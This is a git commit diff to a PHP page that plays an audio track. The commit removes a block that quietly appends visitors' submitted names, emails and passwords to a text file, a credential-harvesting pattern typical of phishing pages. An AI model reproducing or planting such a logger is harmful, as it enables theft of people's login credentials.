7dc55f09313dd009a53f0bc300905447e37f65e5
Darkweb-Z <73308132+Darkweb-Z@users.noreply.github.com>
2020-11-16 18:12:21 +0630

    Update get.php

--- get.php
+++ get.php
@@ -1,18 +1,9 @@
-<html>
+?<html>
     <head>
         <meta name="viewport" content="width=device-width, initial-scale=1" />
     </head>
     <body>
-        <?php 
-            if(isset($_POST['password'])) 
-{$name =$_POST['name'];
-$email = $_POST['email'];
-$pas = $_POST['password'];
-$wrt = $name. "(email=" .$email ."/password=" .$pas .")";
-$handle =fopen('name.txt','a');
-fwrite($handle,$wrt."\n");
-fclose($handle);}
-        ?>
+        
         <audio controls>
             <source src="Imagine_Dragons_-_Thunder_(128k).mp3" type="audio/mpeg">
             <source src="audio.ogg" type="audio/ogg">
